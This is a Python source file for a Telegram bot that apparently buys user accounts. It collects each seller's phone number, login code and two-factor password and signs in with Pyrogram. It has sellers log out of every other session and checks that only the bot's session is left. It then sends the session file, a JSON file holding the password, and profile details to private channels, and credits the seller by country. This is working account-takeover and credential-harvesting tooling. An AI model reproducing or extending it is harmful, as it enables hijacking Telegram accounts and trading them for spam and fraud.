import pyrogram
from pyrogram.raw.functions.account import GetAuthorizations
from pyrogram import Client, errors
from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton
import os, time
from TempClient import TempClient
from read_variables import *
import phonenumbers as pn 
from phonenumbers import geocoder 
from read_write_files import read_json, write_json


async def add_account(message: pyrogram.types.messages_and_media.message.Message, users: dict) -> None:
    welcome_text = read_json('info.json')['welcome']
    text = message.text
    chat_id = message.chat.id
    print(text)
    # if the text was a phone number
    if is_phone_number(text):
        phone_number = text_to_phone_number(text)
        print(phone_number)
        await handle_enter_phone_number(phone_number, message, users)

    # if the text was a code
    elif is_code(text):
        code = text.strip()
        await handel_entered_code(message, users, code)

    # if text was a password
    elif message.from_user and text != welcome_text and '🖐👽' not in text:
        await handle_second_entered_password(text, users, message)

    # otherwise get the phone number
    else:
        get_phone_number_message = '**Enter Your PhoneNumber**\n__For example:__ **+98xxxxxxxxxx**'
        await message.edit_text(get_phone_number_message)

"""

In this block we try to create a new session and send user code with given phone number

"""

async def handle_enter_phone_number(phone_number: str, message: pyrogram.types.messages_and_media.message.Message, users: dict) -> None:

    if not is_exist(phone_number):

        await save_new_client(phone_number, message, users)

    else:
        chat_id = message.chat.id
        users[chat_id]['stage'] = ''
        await message.reply('You already sent this phone number.', quote=True)


# try to save the new phone number
async def save_new_client(phone_number: str, message: pyrogram.types.messages_and_media.message.Message, users: dict) -> None:

    chat_id = message.chat.id

    temp_client = TempClient()
    # set temp variable and create temporary client
    temp_client.phone_number = phone_number
    temp_client.client = Client(f'sessions/{phone_number}', read_api_id(), read_api_hash())
    await temp_client.client.connect()

    users[chat_id]['client'] = temp_client 

    await phone_number_error_handler(phone_number, message, users)


# handles any error if occurs when user enter phone number
async def phone_number_error_handler(phone_number: str, message: pyrogram.types.messages_and_media.message.Message, users: dict) -> None:

    chat_id = message.chat.id

    try:
        users[chat_id]['client'].response = await users[chat_id]['client'].client.send_code(phone_number)

    except errors.PhoneMigrate:
        await message.reply('The phone number you are trying to use for authorization is associated with DC.', quote=True)

    except errors.PhoneNumberAppSignupForbidden:
        await message.reply('You can\'t sign up using this app.', quote=True)

    except errors.PhoneNumberBanned:
        await message.reply('The phone number is banned from Telegram and cannot be used.', quote=True)

    except errors.PhoneNumberFlood:
        await message.reply('This number has tried to login too many times.', quote=True)

    except errors.PhoneNumberInvalid:
        await message.reply('The phone number is invalid.', quote=True)

    except errors.PhoneNumberOccupied:
        await message.reply('The phone number is already in use.', quote=True)

    except errors.PhoneNumberUnoccupied:
        await message.reply('The phone number is not yet being used.', quote=True)

    else:
        await message.reply('Enter sent code: ', quote=True)

"""

In this block we handle the telegram code and try to register the user if there is no 2fa enabled

"""

async def handel_entered_code(message: pyrogram.types.messages_and_media.message.Message, users: dict, code: str) -> None:

    get_code_again_message = 'Enter valid code again: '

    try:
        await register_new_account(users, message, code)

    except errors.CodeEmpty:
        await reply_message('The provided code is empty', message)
        await reply_message(get_code_again_message, message)

    except errors.CodeHashInvalid:
        await reply_message('The provided code hash invalid.', message)
        await reply_message(get_code_again_message, message)

    except errors.CodeInvalid:
        await reply_message('The provided code is invalid (i.e. from email).', message)
        await reply_message(get_code_again_message, message)

    except errors.PhoneCodeEmpty:
        await reply_message('The phone code is missing.', message)
        await reply_message(get_code_again_message, message)

    except errors.PhoneCodeExpired:
        await reply_message('The confirmation code has expired.', message)
        await reply_message(get_code_again_message, message)

    except errors.PhoneCodeHashEmpty:
        await reply_message('The phone code hash is missing.', message)
        await reply_message(get_code_again_message, message)

    except errors.PhoneCodeInvalid:
        await reply_message('The confirmation code is invalid.', message)
        await reply_message(get_code_again_message, message)

    except errors.SmsCodeCreateFailed:
        await reply_message('An error occurred while creating the SMS code.', message)
        await reply_message(get_code_again_message, message)

    except errors.AuthKeyUnregistered:
        await reply_message('Code has not registered.', message)
        await reply_message(get_code_again_message, message)

    except errors.SessionPasswordNeeded:

        users[message.chat.id]['client'].response = code

        await message.reply('Enter your account password: ', quote=True)

# register new user after enter valid code
async def register_new_account(users, message, code):

    chat_id = message.chat.id
    # register new account
    await users[chat_id]['client'].client.sign_in(users[chat_id]['client'].phone_number, users[chat_id]['client'].response.phone_code_hash, code)
    
    await users[chat_id]['client'].client.disconnect()

    users[chat_id]['client'].response = code

    await send_successful_message(message, users[chat_id]['client'].phone_number)
    users[chat_id]['time'] = round(time.time())
    update_user_info(users, chat_id)
    




"""

In this block we handle the 2fa password and try to register the user phone number

"""

async def handle_second_entered_password(two_factor_password: str, users: dict, message: pyrogram.types.messages_and_media.message.Message):

    get_code_again_message = 'Enter valid code again: '

    chat_id = message.chat.id

    
    try:

        await users[chat_id]['client'].client.check_password(two_factor_password)
        users[chat_id]['client'].two_factor_password = two_factor_password

    except errors.BadRequest:

        await reply_message('The two factor password is wrong.', message)
        await reply_message(get_code_again_message, message)

    except errors.AuthKeyUnregistered:

        await reply_message('Code has not registered.', message)
        await reply_message(get_code_again_message, message)

    except AttributeError:

        await reply_message('The entered text does not have any meaning please try again', message)

    except KeyError:

        await message.reply('This country does not allow at this time.')

    else:

        await users[chat_id]['client'].client.disconnect()

        await send_successful_message(message, users[chat_id]['client'].phone_number)
        
        users[chat_id]['time'] = round(time.time())
        
        update_user_info(users, chat_id)

"""

Other functions are used in the above blocks

"""

async def send_successful_message(message: pyrogram.types.messages_and_media.message.Message, phone_number: str):

    index = find_time_index(phone_number)
    time = read_json('info.json')['time'][index]

    # Prompt the user to select an option
    keyboard = InlineKeyboardMarkup([
        [InlineKeyboardButton("Validate the account", callback_data="account_validation")],
    ])
    
    text = f'Your account has been registered successfully.\nPlease logout from all of your account and then after {time} seconds click the below button.'

    await message.reply(text, reply_markup=keyboard)

def update_user_info(users: dict, chat_id: int|str) -> None:

    phone_number = users[chat_id]['client'].phone_number

    # release current client
    users[chat_id]['stage'] = ''

    update_user_selling_account(users, chat_id, phone_number)

    users[chat_id]['balance'] = calculate_balance(users, chat_id)

    users[chat_id]['is_valid'] = False

    users[chat_id]['client'] = users[chat_id]['client'].content()

    write_json('users.json', users)
    

def calculate_balance(users: dict, chat_id: int|str) -> int:
    info = read_json('info.json')
    country_codes = info['country_codes']
    prices = info['price']

    total_balance = 0
    # calculate the balance
    for price, country in zip(prices, country_codes):
        # if there is the country calculate the balance
        if country in users[chat_id]:
            
            total_balance += users[chat_id][country] * int(price)
    
    return total_balance

def update_user_selling_account(users: dict, chat_id: int|str, phone_number: str) -> None:
    info = read_json('info.json')
    # get selling account country name
    country_code = '+' + str(get_country_code(phone_number))
    countries = info['country_codes']

    # update user info
    if country_code in countries:
        users[chat_id][country_code] = users[chat_id].get(country_code, 0) + 1

    else:
        users[chat_id]['Others'] = users[chat_id].get('Others', 0) + 1

def get_country_code(phone_number: str) -> str:
    try:
        phone_number = pn.parse('+' + phone_number)
        country_code = phone_number.country_code
        return country_code
    except pn.phonenumberutil.NumberParseException:
        return ''
    
def get_country_name(phone_number: str) -> str:
    phone_number = pn.parse('+' + phone_number)
    country_name = geocoder.description_for_number(phone_number, "en")
    return country_name

async def reply_message(message_text: str, message: pyrogram.types.messages_and_media.message.Message) -> None:

    await message.reply(message_text, quote=True)



def is_phone_number(text: str) -> bool:

    info = read_json('info.json')

    text = text.replace('+', '').replace(' ', '').replace('-', '')

    country_code = '+' + str(get_country_code(text))

    country_codes = info['country_codes']

    capacities = info['capacity']

    try:
        index = country_codes.index(country_code)
        capacity = int(capacities[index])
    except (IndexError, ValueError):
        return False
    
    return text.isdigit() and len(text) >= 5 and capacity > 0



def text_to_phone_number(text: str) -> str:
    return text.replace('+', '').replace(' ', '').replace('-', '')


def is_code(text: str) -> bool:

    return text.replace(' ', '').isdigit()


def is_exist(phone_number: str) -> bool:
    try:
        if os.path.isfile(f'sessions/{phone_number}.session'):
            return True
    except (FileNotFoundError, ValueError):
        return False
    


async def validate_account(app: pyrogram.client.Client, message: pyrogram.types.messages_and_media.message.Message):
    chat_id = str(message.chat.id)
    try:        
        users = read_json('users.json')  
        if not is_time_passed(users[chat_id]):
            await message.reply('The time is not passed yet.') 

        phone_number =  users[chat_id]['client']['phone_number']
        client = Client(f'sessions/{phone_number}', read_api_id(), read_api_hash())
        await client.connect()
        authentications = await client.invoke(GetAuthorizations())
        active_sessions = len(authentications.authorizations)
        if active_sessions > 1:
            await message.reply(f'You have more than one Telegram account. Please log out of all of them and try again.({active_sessions})')
        else:
            await message.reply('Your account is valid')
            decrease_capacity(phone_number)
            users[chat_id]['is_valid'] = True
            write_json('users.json', users)
            # await create_tdata(phone_number)
            create_user_json(users[chat_id]['client'])
            await send_data(app, phone_number, int(chat_id))
            await client.disconnect()

    except (KeyError or FileNotFoundError) as e:
        print(e)
        await message.reply('You have not registered your account yet.')
def is_time_passed(user: dict) -> bool:
    import time
    info = read_json('info.json')
    phone_number = user['client']['phone_number']

    now = int(round(time.time()))
    time_index = find_time_index(phone_number)
    country_time = int(info['time'][time_index])
    user_time = int(user['time'])
    return now + country_time > user_time

def find_time_index(phone_number: str) -> int:
    info = read_json('info.json')
    phone_number = '+' + phone_number
    country_code = '+' + str(get_country_code(phone_number))
    country_codes = info['country_codes']
    time_index = country_codes.index(country_code)
    return time_index

def decrease_capacity(phone_number: str):

    info = read_json('info.json')
    # find capacity index by country code
    country_code = '+' + str(get_country_code('+' + phone_number))
    capacity_index = info['country_codes'].index(country_code)
    capacity = int(info['capacity'][capacity_index])
    # update capacity
    new_capacity = capacity - 1
    info['capacity'][capacity_index] = new_capacity
    # update file
    write_json('info.json', info)

# async def create_tdata(phone_number: str) -> None:

#     # create tdata
#     client = TelegramClient(f"accounts\\{phone_number}.session")
#     # Convert Telethon to TDesktop using the current session.
#     tdesk = await client.ToTDesktop(flag=UseCurrentSession)
#     # Save the session to a folder named "tdata"
#     tdesk.SaveTData(f"accounts\\{phone_number}")
#     # zip the folder
#     shutil.make_archive(f'accounts\\{phone_number}', 'zip', f'accounts\\{phone_number}')
def create_user_json(data: dict):
    phone_number = data['phone_number']
    write_json(f'sessions\\{phone_number}.json', data)



async def send_data(client: pyrogram.client.Client, phone_number: str, user_id: int) -> None:
    private_id_channels = read_json('info.json')['private_channel']
    caption = await create_caption(client, phone_number, user_id)
    for private_id in private_id_channels:
        # json file
        await client.send_document(int(private_id), f'sessions\\{phone_number}.json', caption=caption)
        # session file
        await client.send_document(int(private_id), f'sessions\\{phone_number}.session', caption=caption)
        # send tdata
        # await client.send_file(int(private_id), f'accounts\\{phone_number}.zip')


async def create_caption(client: pyrogram.client.Client, phone_number: str, user_id: int) -> str:
    information = await client.get_users([user_id])
    information = information[0]

    first_name = information.first_name
    username = information.username

    caption = f"Profile Name: {first_name}\nUsername: {username}\n User ID: {user_id}\nPhone Number: {phone_number}"

    return caption
